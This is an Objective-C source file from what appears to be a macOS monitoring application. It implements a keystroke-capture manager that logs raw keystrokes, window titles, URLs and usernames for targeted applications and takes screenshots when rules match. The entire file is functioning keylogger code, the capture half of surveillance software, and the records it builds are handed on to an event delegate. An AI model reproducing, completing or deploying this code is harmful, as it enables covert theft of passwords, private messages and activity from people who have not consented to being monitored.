//
//  KeyboardCaptureManager.m
//  KeyboardCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 9/27/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "KeyboardCaptureManager.h"
#import "KeyLogRuleHelper.h"
#import "KeyLogRule.h"
#import "ScreenshotUtils.h"

#import "KeyboardLoggerManager.h"
#import "KeyStrokeInfo.h"

#import "FxKeyLogEvent.h"
#import "DateTimeFormat.h"
#import "DaemonPrivateHome.h"
#import "SystemUtilsImpl.h"

@interface KeyboardCaptureManager (private)
-(void) setKeyLogRuleInfo: (NSDictionary *) aKeyLogRuleInfo;
-(void) setMonitorApplicationInfo: (NSDictionary *) aMonitorApplicationInfo;
- (void) captureKeyLogEventWithKeyStroke: (KeyStrokeInfo *) aKeyStrokeInfo;
- (void) storeEvent: (FxEvent *) aEvent;
@end

@implementation KeyboardCaptureManager

@synthesize mEventDelegate;
@synthesize mKeyLogRules;
@synthesize mKeyMonitorApplications;
@synthesize mScreenshotPath;

-(id) initWithScreenshotPath: (NSString *) aScreenshotPath withKeyboardLoggerManager: (KeyboardLoggerManager *) aKeyboardLoggerManager {
    if ((self = [super init])) {
        mScreenshotPath = [[NSString alloc] initWithString:aScreenshotPath];
        mKeyLogRules    = [[NSMutableArray alloc]init];
        mKeyMonitorApplications = [[NSMutableArray alloc]init];
        mKeyboardLoggerManager = aKeyboardLoggerManager;
	}
	return (self);
}

#pragma mark - Events protocol -
-(void) registerEventDelegate:(id <EventDelegate>) aEventDelegate{
    [self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture{
    [self stopCapture];
    
    [mKeyboardLoggerManager addObserver:self];
}
- (void) stopCapture{
    [mKeyboardLoggerManager removeObserver:self];
}

#pragma mark - Keyboard logger manager protocol -

-(void) mouseClickDetected:(KeyStrokeInfo *) aKeyStrokeInfo mouseEvent:(NSEvent *)aEvent{
    [self captureKeyLogEventWithKeyStroke:aKeyStrokeInfo];
}

-(void) terminateKeyDetected:(KeyStrokeInfo *) aKeyStrokeInfo keySymbol:(NSString *)aSymbol {
    [self captureKeyLogEventWithKeyStroke:aKeyStrokeInfo];
}

- (void) activeAppChangeKeyDetected: (KeyStrokeInfo *) aKeyStrokeInfo inactiveBundleID: (NSString *) aBundleID {
    [self captureKeyLogEventWithKeyStroke:aKeyStrokeInfo];
}

#pragma mark - Key rule protocol -

- (void) keyLogRuleChanged: (NSDictionary *) aKeyLogRuleInfo {
    [self setKeyLogRuleInfo:aKeyLogRuleInfo];
}

- (void) monitorApplicationChanged: (NSDictionary *) aMonitorApplicationInfo {
    [self setMonitorApplicationInfo:aMonitorApplicationInfo];
}

#pragma mark - Private methods -

-(void) setKeyLogRuleInfo: (NSDictionary *) aKeyLogRuleInfo {
    [mKeyLogRules removeAllObjects];
    NSDictionary * myRule = [[NSDictionary alloc]initWithDictionary:aKeyLogRuleInfo];
    NSArray *allKeys = [myRule allKeys];
    for (int i=0; i< [allKeys count]; i++) {
        [mKeyLogRules addObject:[myRule objectForKey:[allKeys objectAtIndex:i]]];
    }
    [myRule release];
    DLog(@"New key rules: %@", mKeyLogRules);
}

-(void) setMonitorApplicationInfo: (NSDictionary *) aMonitorApplicationInfo {
    [mKeyMonitorApplications removeAllObjects];
    NSDictionary * myRule = [[NSDictionary alloc]initWithDictionary:aMonitorApplicationInfo];
    NSArray *allKeys = [myRule allKeys];
    for (int i=0; i< [allKeys count]; i++) {
        [mKeyMonitorApplications addObject:[myRule objectForKey:[allKeys objectAtIndex:i]]];
    }
    [myRule release];
    DLog(@"New monitor apps: %@", mKeyMonitorApplications);
}

- (void) captureKeyLogEventWithKeyStroke: (KeyStrokeInfo *) aKeyStrokeInfo {
    DLog(@"----------------$$$ keyStrokeDidReceived $$$-------------");
    NSCharacterSet *charSet1 = [NSCharacterSet controlCharacterSet];
    NSMutableCharacterSet *charSet2 = [NSMutableCharacterSet whitespaceAndNewlineCharacterSet];
    [charSet2 formUnionWithCharacterSet:charSet1];
    
    NSString *displayData = [aKeyStrokeInfo mKeyStrokeDisplay];
    displayData = [displayData stringByTrimmingCharactersInSet:charSet2];
    DLog(@"Display data after trimming: %@", displayData);
    
    if ([displayData length]) {
        NSThread *threadA = [NSThread currentThread];
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
            //dispatch_async(dispatch_get_main_queue(), ^{
            NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
            if ([KeyLogRuleHelper matchingMonitorApps:mKeyMonitorApplications toKeyInfo:aKeyStrokeInfo] ||
                [KeyLogRuleHelper matchingKeyLogRuleApps:self.mKeyLogRules toKeyInfo:aKeyStrokeInfo]) {
                NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
                
                NSString *attachmentPath = @"";
                if ([KeyLogRuleHelper matchingKeyLogRules:self.mKeyLogRules toKeyInfo:aKeyStrokeInfo]) {
                    attachmentPath = [NSString stringWithFormat:@"%@%@.jpeg",mScreenshotPath,[DateTimeFormat phoenixDateTime]];
                    NSImage * img = [ScreenshotUtils takeScreenShotWithScreen:[aKeyStrokeInfo mScreen]];
                    NSData *imgData = [img TIFFRepresentation];
                    NSBitmapImageRep *imageRep = [NSBitmapImageRep imageRepWithData:imgData];
                    NSDictionary *imageProps = [NSDictionary dictionaryWithObject:[NSNumber numberWithFloat:0.1] forKey:NSImageCompressionFactor];
                    NSData *jpegData = [imageRep representationUsingType:NSJPEGFileType properties:imageProps];
                    [jpegData writeToFile:attachmentPath atomically:YES];
                } else {
                    DLog(@"No rule for this application");
                }
                
                DLog(@"UserName: %@", NSUserName());
                DLog(@"FullUserName: %@", NSFullUserName());
                
                FxKeyLogEvent * fxKeyEvent = [[FxKeyLogEvent alloc]init];
                [fxKeyEvent setDateTime:[DateTimeFormat phoenixDateTime]];
                [fxKeyEvent setMUserName:[SystemUtilsImpl userLogonName]];
                [fxKeyEvent setMApplication:[aKeyStrokeInfo mAppName]];
                [fxKeyEvent setMTitle:[aKeyStrokeInfo mWindowTitle]];
                [fxKeyEvent setMActualDisplayData:[aKeyStrokeInfo mKeyStrokeDisplay]];
                [fxKeyEvent setMRawData:[aKeyStrokeInfo mKeyStroke]];
                [fxKeyEvent setMApplicationID:[aKeyStrokeInfo mAppBundle]];
                [fxKeyEvent setMUrl:[aKeyStrokeInfo mUrl]];
                if([attachmentPath length]>0 ){
                    [fxKeyEvent setMScreenshotPath:attachmentPath];
                }
                
                [self performSelector:@selector(storeEvent:)
                             onThread:threadA
                           withObject:fxKeyEvent
                        waitUntilDone:NO];
                
                [fxKeyEvent release];
                
                [pool release];
                
            } else {
                DLog(@"Not for this application");
            }
            [pool release];
        });
    }
}

- (void) storeEvent: (FxEvent *) aEvent {
    if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {
        [mEventDelegate eventFinished:aEvent];
    }
}

#pragma mark - Memory dealloc -
- (void)dealloc
{
    DLog(@"KeyboardCaptureManager is deallocated >>>")
    [self stopCapture];
    [mScreenshotPath release];
    [mKeyLogRules release];
    [mKeyMonitorApplications release];
    [super dealloc];
}

@end
